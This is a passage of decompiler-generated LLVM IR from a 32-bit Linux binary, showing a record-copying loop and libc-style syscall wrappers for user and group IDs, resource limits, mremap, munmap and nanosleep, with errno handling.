  %stack_var_-32.034 = phi i32 [ -1, %dec_label_pc_8052602.lr.ph ], [ %v3_8052647, %dec_label_pc_8052644 ]
  %stack_var_-36.033 = phi i32 [ -1, %dec_label_pc_8052602.lr.ph ], [ %v3_8052644, %dec_label_pc_8052644 ]
  %v0_805265032 = phi i32 [ %v1_80525b7, %dec_label_pc_8052602.lr.ph ], [ %v2_805268d, %dec_label_pc_8052644 ]
  %v1_805265531 = phi i32 [ %tmp14, %dec_label_pc_8052602.lr.ph ], [ %v2_8052612, %dec_label_pc_8052644 ]
  %v0_805261c30 = phi i32 [ %v3_80525c9, %dec_label_pc_8052602.lr.ph ], [ %v1_805268f, %dec_label_pc_8052644 ]
  %v1_8052602 = add i32 %v0_805265032, 16
  %v2_8052602 = inttoptr i32 %v1_8052602 to i16*
  %v3_8052602 = load i16, i16* %v2_8052602, align 2
  %v4_8052602 = zext i16 %v3_8052602 to i32
  %v1_8052606 = add nuw nsw i32 %v4_8052602, 3
  %v1_805260c = and i32 %v1_8052606, 131068
  store i32 %v1_805260c, i32* %ecx.global-to-local, align 4
  store i32 %v5_805260f, i32* %eax.global-to-local, align 4
  %v2_8052612 = add i32 %v1_805260c, %v1_805265531
  %tmp40 = icmp ugt i32 %v2_8052612, %v5_805260f
  br i1 %tmp40, label %dec_label_pc_805261c, label %dec_label_pc_8052644

dec_label_pc_805261c:                             ; preds = %dec_label_pc_8052602
  %v1_805261c = add i32 %v0_805261c30, -4
  %v2_805261c = inttoptr i32 %v1_805261c to i32*
  store i32 0, i32* %v2_805261c, align 4
  %v5_805261e = add i32 %v0_805261c30, -8
  %v6_805261e = inttoptr i32 %v5_805261e to i32*
  store i32 %stack_var_-32.034, i32* %v6_805261e, align 4
  %v5_8052621 = add i32 %v0_805261c30, -12
  %v6_8052621 = inttoptr i32 %v5_8052621 to i32*
  store i32 %stack_var_-36.033, i32* %v6_8052621, align 4
  %v5_8052624 = add i32 %v0_805261c30, -16
  %v6_8052624 = inttoptr i32 %v5_8052624 to i32*
  store i32 %arg1, i32* %v6_8052624, align 4
  %v1_8052627 = call i32 @function_80527af(i32 %v2_8052612)
  store i32 %v1_8052627, i32* %eax.global-to-local, align 4
  %v0_805262f = load i32, i32* @esi, align 4
  %v15_805262f = icmp eq i32 %v0_805262f, %tmp14
  %v1_8052632 = icmp eq i1 %v15_805262f, false
  br i1 %v1_8052632, label %dec_label_pc_80526a0, label %dec_label_pc_8052634

dec_label_pc_8052634:                             ; preds = %dec_label_pc_805261c
  %v1_8052634 = call i32 @function_805078b(i32 %v2_8052612)
  store i32 %v1_8052634, i32* %eax.global-to-local, align 4
  %v1_8052639 = inttoptr i32 %v1_8052634 to i32*
  store i32 22, i32* %v1_8052639, align 4
  br label %dec_label_pc_80526a5

dec_label_pc_8052644:                             ; preds = %dec_label_pc_8052602
  %v1_8052644 = add i32 %v0_805265032, 8
  %v2_8052644 = inttoptr i32 %v1_8052644 to i32*
  %v3_8052644 = load i32, i32* %v2_8052644, align 4
  store i32 %v3_8052644, i32* %eax.global-to-local, align 4
  %v1_8052647 = add i32 %v0_805265032, 12
  %v2_8052647 = inttoptr i32 %v1_8052647 to i32*
  %v3_8052647 = load i32, i32* %v2_8052647, align 4
  %v1_8052650 = inttoptr i32 %v0_805265032 to i32*
  %v2_8052650 = load i32, i32* %v1_8052650, align 4
  store i32 %v2_8052650, i32* %eax.global-to-local, align 4
  %v1_8052652 = add i32 %v0_805265032, 4
  %v2_8052652 = inttoptr i32 %v1_8052652 to i32*
  %v3_8052652 = load i32, i32* %v2_8052652, align 4
  %v2_8052655 = add i32 %v1_805265531, 4
  %v3_8052655 = inttoptr i32 %v2_8052655 to i32*
  store i32 %v3_8052652, i32* %v3_8052655, align 4
  %v0_8052658 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052658 = load i32, i32* @esi, align 4
  %v2_8052658 = inttoptr i32 %v1_8052658 to i32*
  store i32 %v0_8052658, i32* %v2_8052658, align 4
  %v0_805265a = load i32, i32* @ebx, align 4
  %v1_805265a = add i32 %v0_805265a, 8
  %v2_805265a = inttoptr i32 %v1_805265a to i32*
  %v3_805265a = load i32, i32* %v2_805265a, align 4
  store i32 %v3_805265a, i32* %eax.global-to-local, align 4
  %v1_805265d = add i32 %v0_805265a, 12
  %v2_805265d = inttoptr i32 %v1_805265d to i32*
  %v3_805265d = load i32, i32* %v2_805265d, align 4
  %v1_8052660 = load i32, i32* @esi, align 4
  %v2_8052660 = add i32 %v1_8052660, 12
  %v3_8052660 = inttoptr i32 %v2_8052660 to i32*
  store i32 %v3_805265d, i32* %v3_8052660, align 4
  %v0_8052663 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052663 = load i32, i32* @esi, align 4
  %v2_8052663 = add i32 %v1_8052663, 8
  %v3_8052663 = inttoptr i32 %v2_8052663 to i32*
  store i32 %v0_8052663, i32* %v3_8052663, align 4
  %v0_8052666 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052666 = trunc i32 %v0_8052666 to i16
  %v2_8052666 = load i32, i32* @esi, align 4
  %v3_8052666 = add i32 %v2_8052666, 16
  %v4_8052666 = inttoptr i32 %v3_8052666 to i16*
  store i16 %v1_8052666, i16* %v4_8052666, align 2
  %v0_805266a = load i32, i32* @ebx, align 4
  %v1_805266a = add i32 %v0_805266a, 18
  %v2_805266a = inttoptr i32 %v1_805266a to i8*
  %v3_805266a = load i8, i8* %v2_805266a, align 1
  %v4_805266a = zext i8 %v3_805266a to i32
  %v5_805266a = load i32, i32* %eax.global-to-local, align 4
  %v6_805266a = and i32 %v5_805266a, -256
  %v7_805266a = or i32 %v6_805266a, %v4_805266a
  store i32 %v7_805266a, i32* %eax.global-to-local, align 4
  %v2_805266d = load i32, i32* @esi, align 4
  %v3_805266d = add i32 %v2_805266d, 18
  %v4_805266d = inttoptr i32 %v3_805266d to i8*
  store i8 %v3_805266a, i8* %v4_805266d, align 1
  %v0_8052670 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052670 = load i32, i32* @esp, align 4
  %v2_8052670 = add i32 %v1_8052670, -4
  %v3_8052670 = inttoptr i32 %v2_8052670 to i32*
  store i32 %v0_8052670, i32* %v3_8052670, align 4
  %v0_8052671 = load i32, i32* @ebx, align 4
  %v1_8052671 = add i32 %v0_8052671, 16
  %v2_8052671 = inttoptr i32 %v1_8052671 to i16*
  %v3_8052671 = load i16, i16* %v2_8052671, align 2
  %v4_8052671 = zext i16 %v3_8052671 to i32
  %v1_8052675 = add nsw i32 %v4_8052671, -19
  %v2_8052678 = add i32 %v1_8052670, -8
  %v3_8052678 = inttoptr i32 %v2_8052678 to i32*
  store i32 %v1_8052675, i32* %v3_8052678, align 4
  %v0_8052679 = load i32, i32* @ebx, align 4
  %v1_8052679 = add i32 %v0_8052679, 19
  %v2_805267c = add i32 %v1_8052670, -12
  %v3_805267c = inttoptr i32 %v2_805267c to i32*
  store i32 %v1_8052679, i32* %v3_805267c, align 4
  %v0_805267d = load i32, i32* @esi, align 4
  %v1_805267d = add i32 %v0_805267d, 19
  store i32 %v1_805267d, i32* %eax.global-to-local, align 4
  %v2_8052680 = add i32 %v1_8052670, -16
  %v3_8052680 = inttoptr i32 %v2_8052680 to i32*
  store i32 %v1_805267d, i32* %v3_8052680, align 4
  %v3_8052681 = inttoptr i32 %v2_8052612 to i16*
  %v4_8052681 = call i32 @function_80529aa(i16* %v3_8052681, i32 %v3_8052644, i32 %v3_8052647)
  store i32 %v4_8052681, i32* %eax.global-to-local, align 4
  %v0_8052686 = load i32, i32* @ebx, align 4
  %v1_8052686 = add i32 %v0_8052686, 16
  %v2_8052686 = inttoptr i32 %v1_8052686 to i16*
  %v3_8052686 = load i16, i16* %v2_8052686, align 2
  %v4_8052686 = zext i16 %v3_8052686 to i32
  store i32 %v2_8052612, i32* @esi, align 4
  %v2_805268d = add i32 %v4_8052686, %v0_8052686
  store i32 %v2_805268d, i32* @ebx, align 4
  %v0_805268f = load i32, i32* @esp, align 4
  %v1_805268f = add i32 %v0_805268f, 16
  store i32 %v5_8052695, i32* %eax.global-to-local, align 4
  %v7_8052698 = icmp ult i32 %v2_805268d, %v5_8052695
  br i1 %v7_8052698, label %dec_label_pc_8052602, label %dec_label_pc_80526a0

dec_label_pc_80526a0:                             ; preds = %dec_label_pc_80525e9, %dec_label_pc_8052644, %dec_label_pc_805261c
  %v0_80526a0 = phi i32 [ %v0_805262f, %dec_label_pc_805261c ], [ %tmp14, %dec_label_pc_80525e9 ], [ %v2_8052612, %dec_label_pc_8052644 ]
  store i32 %v0_80526a0, i32* %eax.global-to-local, align 4
  %v5_80526a2 = sub i32 %v0_80526a0, %tmp14
  br label %dec_label_pc_80526a5

dec_label_pc_80526a5:                             ; preds = %dec_label_pc_8052634, %dec_label_pc_80525d4, %dec_label_pc_80526a0
  %storemerge = phi i32 [ %v5_80526a2, %dec_label_pc_80526a0 ], [ -1, %dec_label_pc_80525d4 ], [ -1, %dec_label_pc_8052634 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_805259e, i32* @ebx, align 4
  store i32 %v0_805259c, i32* %edi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_80526a0, { 1, 0 }
  uselistorder i32 %v2_805268d, { 0, 2, 1 }
  uselistorder i32 %v3_8052647, { 1, 0 }
  uselistorder i32 %v3_8052644, { 1, 2, 0 }
  uselistorder i32 %v2_8052612, { 0, 5, 6, 1, 2, 4, 3 }
  uselistorder i32 %v0_805261c30, { 3, 2, 1, 0 }
  uselistorder i32 %v0_805265032, { 3, 4, 1, 2, 0 }
  uselistorder i32 %v5_8052695, { 2, 3, 0, 1 }
  uselistorder i32 %v5_80525c7, { 0, 3, 2, 1, 4 }
  uselistorder i32 %tmp14, { 5, 0, 2, 1, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 16, 1, 15, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 19, 17, 0, 18 }
  uselistorder i32 (i16*, i32, i32)* @function_80529aa, { 0, 3, 4, 5, 1, 2 }
  uselistorder i32 19, { 1, 2, 3, 0 }
  uselistorder i32 18, { 1, 2, 3, 0 }
  uselistorder i32 22, { 5, 6, 2, 3, 4, 9, 7, 8, 0, 1 }
  uselistorder i32 -12, { 0, 7, 32, 33, 1, 2, 22, 23, 24, 25, 9, 10, 26, 12, 13, 14, 20, 15, 16, 17, 8, 21, 19, 3, 27, 18, 11, 4, 28, 29, 5, 6, 30, 31 }
  uselistorder i32 -8, { 0, 3, 34, 32, 35, 33, 36, 37, 38, 18, 19, 20, 21, 22, 23, 5, 6, 24, 8, 9, 10, 16, 11, 12, 13, 4, 17, 15, 25, 26, 14, 7, 1, 27, 28, 2, 29, 30, 31 }
  uselistorder i32* @esp, { 15, 16, 17, 5, 6, 7, 8, 9, 30, 31, 32, 33, 34, 35, 36, 37, 12, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 80, 81, 82, 10, 14, 13, 126, 127, 144, 145, 146, 83, 84, 85, 86, 87, 88, 89, 90, 116, 117, 92, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 104, 105, 106, 107, 108, 109, 118, 119, 120, 121, 122, 123, 124, 125, 110, 111, 112, 113, 114, 115, 165, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 0, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 159, 160, 93, 91, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 161, 162, 163, 2, 164, 166, 167, 168, 169, 170, 171, 172, 199, 173, 174, 175, 176, 177, 179, 180, 178, 181, 182, 183, 184, 185, 186, 195, 196, 197, 187, 188, 189, 190, 191, 192, 193, 194, 11, 198, 1, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 3, 4, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79 }
  uselistorder i32 15, { 2, 1, 3, 0 }
  uselistorder i32 -16, { 0, 9, 55, 56, 2, 3, 36, 37, 38, 39, 40, 15, 12, 13, 41, 42, 21, 14, 16, 17, 18, 19, 20, 32, 33, 23, 22, 24, 25, 26, 27, 10, 11, 34, 35, 30, 31, 4, 43, 44, 28, 29, 1, 5, 45, 6, 46, 47, 48, 7, 8, 50, 49, 51, 52, 53, 54 }
  uselistorder i32 30, { 4, 3, 1, 0, 5, 2 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80526a5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80526a0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8052602, { 1, 0 }
}

define i32 @function_80526ad() local_unnamed_addr {
dec_label_pc_80526ad:
  %stack_var_-8 = alloca i32, align 4
  %v2_80526b0 = ptrtoint i32* %stack_var_-8 to i32
  %v2_80526b7 = call i32 @function_8052757(i32 7, i32 %v2_80526b0)
  store i32 256, i32* @edx, align 4
  %v2_80526c4 = icmp slt i32 %v2_80526b7, 0
  br i1 %v2_80526c4, label %dec_label_pc_80526cc, label %dec_label_pc_80526c8

dec_label_pc_80526c8:                             ; preds = %dec_label_pc_80526ad
  %v3_80526c8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_80526c8, i32* @edx, align 4
  br label %dec_label_pc_80526cc

dec_label_pc_80526cc:                             ; preds = %dec_label_pc_80526ad, %dec_label_pc_80526c8
  %v0_80526cc = phi i32 [ 256, %dec_label_pc_80526ad ], [ %v3_80526c8, %dec_label_pc_80526c8 ]
  ret i32 %v0_80526cc

; uselistorder directives
  uselistorder i32 7, { 3, 0, 4, 1, 2, 7, 8, 9, 6, 5 }
  uselistorder label %dec_label_pc_80526cc, { 1, 0 }
}

define i32 @function_80526d2() local_unnamed_addr {
dec_label_pc_80526d2:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80526d2 = load i32, i32* @ebx, align 4
  store i32 %v0_80526d2, i32* %stack_var_-4, align 4
  %v1_80526db = call i32 @int80_syscall(i32 202)
  store i32 %v1_80526db, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_80526db, -4095
  br i1 %tmp7, label %dec_label_pc_80526f2, label %dec_label_pc_80526e6

dec_label_pc_80526e6:                             ; preds = %dec_label_pc_80526d2
  %v1_80526e6 = call i32 @function_805078b(i32 %v0_80526d2)
  %v0_80526eb = load i32, i32* %ebx.global-to-local, align 4
  %v1_80526eb = sub i32 0, %v0_80526eb
  %v2_80526ed = inttoptr i32 %v1_80526e6 to i32*
  store i32 %v1_80526eb, i32* %v2_80526ed, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80526f6.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80526f2

dec_label_pc_80526f2:                             ; preds = %dec_label_pc_80526d2, %dec_label_pc_80526e6
  %v2_80526f6 = phi i32 [ %v0_80526d2, %dec_label_pc_80526d2 ], [ %v2_80526f6.pre, %dec_label_pc_80526e6 ]
  %v0_80526f2 = phi i32 [ %v1_80526db, %dec_label_pc_80526d2 ], [ -1, %dec_label_pc_80526e6 ]
  store i32 %v2_80526f6, i32* @ebx, align 4
  ret i32 %v0_80526f2

; uselistorder directives
  uselistorder i32 %v1_80526db, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80526f2, { 1, 0 }
}

define i32 @function_80526f8() local_unnamed_addr {
dec_label_pc_80526f8:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80526f8 = load i32, i32* @ebx, align 4
  store i32 %v0_80526f8, i32* %stack_var_-4, align 4
  %v1_8052701 = call i32 @int80_syscall(i32 201)
  store i32 %v1_8052701, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8052701, -4095
  br i1 %tmp7, label %dec_label_pc_8052718, label %dec_label_pc_805270c

dec_label_pc_805270c:                             ; preds = %dec_label_pc_80526f8
  %v1_805270c = call i32 @function_805078b(i32 %v0_80526f8)
  %v0_8052711 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052711 = sub i32 0, %v0_8052711
  %v2_8052713 = inttoptr i32 %v1_805270c to i32*
  store i32 %v1_8052711, i32* %v2_8052713, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805271c.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052718

dec_label_pc_8052718:                             ; preds = %dec_label_pc_80526f8, %dec_label_pc_805270c
  %v2_805271c = phi i32 [ %v0_80526f8, %dec_label_pc_80526f8 ], [ %v2_805271c.pre, %dec_label_pc_805270c ]
  %v0_8052718 = phi i32 [ %v1_8052701, %dec_label_pc_80526f8 ], [ -1, %dec_label_pc_805270c ]
  store i32 %v2_805271c, i32* @ebx, align 4
  ret i32 %v0_8052718

; uselistorder directives
  uselistorder i32 %v1_8052701, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052718, { 1, 0 }
}

define i32 @function_805271e() local_unnamed_addr {
dec_label_pc_805271e:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805271e = load i32, i32* @ebx, align 4
  store i32 %v0_805271e, i32* %stack_var_-4, align 4
  %v1_8052727 = call i32 @int80_syscall(i32 200)
  store i32 %v1_8052727, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8052727, -4095
  br i1 %tmp7, label %dec_label_pc_805273e, label %dec_label_pc_8052732

dec_label_pc_8052732:                             ; preds = %dec_label_pc_805271e
  %v1_8052732 = call i32 @function_805078b(i32 %v0_805271e)
  %v0_8052737 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052737 = sub i32 0, %v0_8052737
  %v2_8052739 = inttoptr i32 %v1_8052732 to i32*
  store i32 %v1_8052737, i32* %v2_8052739, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8052742.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805273e

dec_label_pc_805273e:                             ; preds = %dec_label_pc_805271e, %dec_label_pc_8052732
  %v2_8052742 = phi i32 [ %v0_805271e, %dec_label_pc_805271e ], [ %v2_8052742.pre, %dec_label_pc_8052732 ]
  %v0_805273e = phi i32 [ %v1_8052727, %dec_label_pc_805271e ], [ -1, %dec_label_pc_8052732 ]
  store i32 %v2_8052742, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805273e

; uselistorder directives
  uselistorder i32 %v1_8052727, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805273e, { 1, 0 }
}

define i32 @function_8052744() local_unnamed_addr {
dec_label_pc_8052744:
  %v0_8052744 = load i32, i32* @global_var_8054404.64, align 4
  %v1_805274e = icmp eq i32 %v0_8052744, 0
  %.v0_8052744 = select i1 %v1_805274e, i32 4096, i32 %v0_8052744
  store i32 %.v0_8052744, i32* @edx, align 4
  ret i32 %.v0_8052744

; uselistorder directives
  uselistorder i32 4096, { 0, 2, 3, 1 }
}

define i32 @function_8052757(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8052757:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052757 = load i32, i32* @ebx, align 4
  store i32 %v0_8052757, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_805276a = call i32 @int80_syscall(i32 191)
  store i32 %v1_805276a, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_805276a, -4095
  br i1 %tmp9, label %dec_label_pc_8052783, label %dec_label_pc_8052777

dec_label_pc_8052777:                             ; preds = %dec_label_pc_8052757
  %v1_8052777 = call i32 @function_805078b(i32 %v0_8052757)
  %v0_805277c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805277c = sub i32 0, %v0_805277c
  %v2_805277e = inttoptr i32 %v1_8052777 to i32*
  store i32 %v1_805277c, i32* %v2_805277e, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8052787.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052783

dec_label_pc_8052783:                             ; preds = %dec_label_pc_8052757, %dec_label_pc_8052777
  %v2_8052787 = phi i32 [ %v0_8052757, %dec_label_pc_8052757 ], [ %v2_8052787.pre, %dec_label_pc_8052777 ]
  %v0_8052783 = phi i32 [ %v1_805276a, %dec_label_pc_8052757 ], [ -1, %dec_label_pc_8052777 ]
  store i32 %v2_8052787, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8052783

; uselistorder directives
  uselistorder i32 %v1_805276a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052783, { 1, 0 }
}

define i32 @function_8052789() local_unnamed_addr {
dec_label_pc_8052789:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052789 = load i32, i32* @ebx, align 4
  store i32 %v0_8052789, i32* %stack_var_-4, align 4
  %v1_8052792 = call i32 @int80_syscall(i32 199)
  store i32 %v1_8052792, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8052792, -4095
  br i1 %tmp7, label %dec_label_pc_80527a9, label %dec_label_pc_805279d

dec_label_pc_805279d:                             ; preds = %dec_label_pc_8052789
  %v1_805279d = call i32 @function_805078b(i32 %v0_8052789)
  %v0_80527a2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80527a2 = sub i32 0, %v0_80527a2
  %v2_80527a4 = inttoptr i32 %v1_805279d to i32*
  store i32 %v1_80527a2, i32* %v2_80527a4, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80527ad.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80527a9

dec_label_pc_80527a9:                             ; preds = %dec_label_pc_8052789, %dec_label_pc_805279d
  %v2_80527ad = phi i32 [ %v0_8052789, %dec_label_pc_8052789 ], [ %v2_80527ad.pre, %dec_label_pc_805279d ]
  %v0_80527a9 = phi i32 [ %v1_8052792, %dec_label_pc_8052789 ], [ -1, %dec_label_pc_805279d ]
  store i32 %v2_80527ad, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80527a9

; uselistorder directives
  uselistorder i32 %v1_8052792, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80527a9, { 1, 0 }
}

define i32 @function_80527af(i32 %arg1) local_unnamed_addr {
dec_label_pc_80527af:
  %esi.global-to-local = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %v2_80527c5 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80527c5, i32* %esi.global-to-local, align 4
  %v1_80527dc = call i32 @int80_syscall(i32 140)
  store i32 %v1_80527dc, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_80527dc, -4095
  br i1 %tmp18, label %dec_label_pc_80527f6, label %dec_label_pc_80527e8

dec_label_pc_80527e8:                             ; preds = %dec_label_pc_80527af
  %v2_80527c9 = ashr i32 %tmp8, 31
  %v1_80527e8 = call i32 @function_805078b(i32 %v2_80527c9)
  %v0_80527ed = load i32, i32* %esi.global-to-local, align 4
  %v1_80527ed = sub i32 0, %v0_80527ed
  %v2_80527ef = inttoptr i32 %v1_80527e8 to i32*
  store i32 %v1_80527ed, i32* %v2_80527ef, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80527fa

dec_label_pc_80527f6:                             ; preds = %dec_label_pc_80527af
  %v1_80527f6 = icmp eq i32 %v1_80527dc, 0
  br i1 %v1_80527f6, label %dec_label_pc_80527ff, label %dec_label_pc_80527fa

dec_label_pc_80527fa:                             ; preds = %dec_label_pc_80527f6, %dec_label_pc_80527e8
  %v0_80527fa = phi i32 [ %v1_80527dc, %dec_label_pc_80527f6 ], [ -1, %dec_label_pc_80527e8 ]
  br label %dec_label_pc_8052807

dec_label_pc_80527ff:                             ; preds = %dec_label_pc_80527f6
  %v3_80527ff = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_8052807

dec_label_pc_8052807:                             ; preds = %dec_label_pc_80527fa, %dec_label_pc_80527ff
  %v0_805280d = phi i32 [ %v0_80527fa, %dec_label_pc_80527fa ], [ %v3_80527ff, %dec_label_pc_80527ff ]
  ret i32 %v0_805280d

; uselistorder directives
  uselistorder i32 %v1_80527dc, { 1, 2, 0, 3 }
  uselistorder i32 31, { 7, 5, 0, 1, 2, 3, 6, 4, 8 }
  uselistorder i32 140, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052807, { 1, 0 }
}

define i32 @function_805280e(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_805280e:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805280f = load i32, i32* @esi, align 4
  store i32 %v0_805280f, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8052827 = load i32, i32* @ebx, align 4
  %v5_805282f = call i32* (i32*, i32, i32, i32, ...) @mremap(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v6_805282f = ptrtoint i32* %v5_805282f to i32
  store i32 %v0_8052827, i32* @ebx, align 4
  store i32 %v6_805282f, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ugt i32* %v5_805282f, inttoptr (i32 -4096 to i32*)
  br i1 %tmp13, label %dec_label_pc_805283b, label %dec_label_pc_8052847

dec_label_pc_805283b:                             ; preds = %dec_label_pc_805280e
  %v1_805283b = call i32 @function_805078b(i32 %v0_8052827)
  %v0_8052840 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052840 = sub i32 0, %v0_8052840
  %v2_8052842 = inttoptr i32 %v1_805283b to i32*
  store i32 %v1_8052840, i32* %v2_8052842, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_805284a.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8052847

dec_label_pc_8052847:                             ; preds = %dec_label_pc_805280e, %dec_label_pc_805283b
  %v2_805284a = phi i32 [ %v0_805280f, %dec_label_pc_805280e ], [ %v2_805284a.pre, %dec_label_pc_805283b ]
  %v0_8052847 = phi i32 [ %v6_805282f, %dec_label_pc_805280e ], [ -1, %dec_label_pc_805283b ]
  %v2_8052849 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052849, i32* @edx, align 4
  store i32 %v2_805284a, i32* @esi, align 4
  ret i32 %v0_8052847

; uselistorder directives
  uselistorder i32 %v0_8052827, { 1, 0 }
  uselistorder label %dec_label_pc_8052847, { 1, 0 }
}

define i32 @function_805284d(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805284d:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805284d = load i32, i32* @ebx, align 4
  store i32 %v0_805284d, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v3_8052860 = call i32 @munmap(i32* %arg1, i32 %arg2)
  store i32 %v3_8052860, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v3_8052860, -4095
  br i1 %tmp10, label %dec_label_pc_8052879, label %dec_label_pc_805286d

dec_label_pc_805286d:                             ; preds = %dec_label_pc_805284d
  %v1_805286d = call i32 @function_805078b(i32 %v0_805284d)
  %v0_8052872 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052872 = sub i32 0, %v0_8052872
  %v2_8052874 = inttoptr i32 %v1_805286d to i32*
  store i32 %v1_8052872, i32* %v2_8052874, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805287d.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052879

dec_label_pc_8052879:                             ; preds = %dec_label_pc_805284d, %dec_label_pc_805286d
  %v2_805287d = phi i32 [ %v0_805284d, %dec_label_pc_805284d ], [ %v2_805287d.pre, %dec_label_pc_805286d ]
  %v0_8052879 = phi i32 [ %v3_8052860, %dec_label_pc_805284d ], [ -1, %dec_label_pc_805286d ]
  %v2_805287b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805287b, i32* @edx, align 4
  store i32 %v2_805287d, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8052879

; uselistorder directives
  uselistorder i32 %v3_8052860, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052879, { 1, 0 }
}

define i32 @function_805287f(%timespec* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805287f:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-4 = alloca i32, align 4
  %v0_805287f = load i32, i32* @ebx, align 4
  store i32 %v0_805287f, i32* %stack_var_-4, align 4
  %v4_8052883 = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_8052883, i32* %ebx.global-to-local, align 4
  %v6_8052892 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp4)
  store i32 %v6_8052892, i32* %ebx.global-to-local, align 4
  %tmp11 = icmp ult i32 %v6_8052892, -4095
  br i1 %tmp11, label %dec_label_pc_80528ab, label %dec_label_pc_805289f

dec_label_pc_805289f:                             ; preds = %dec_label_pc_805287f
  %v1_805289f = call i32 @function_805078b(i32 %v0_805287f)
  %v0_80528a4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80528a4 = sub i32 0, %v0_80528a4
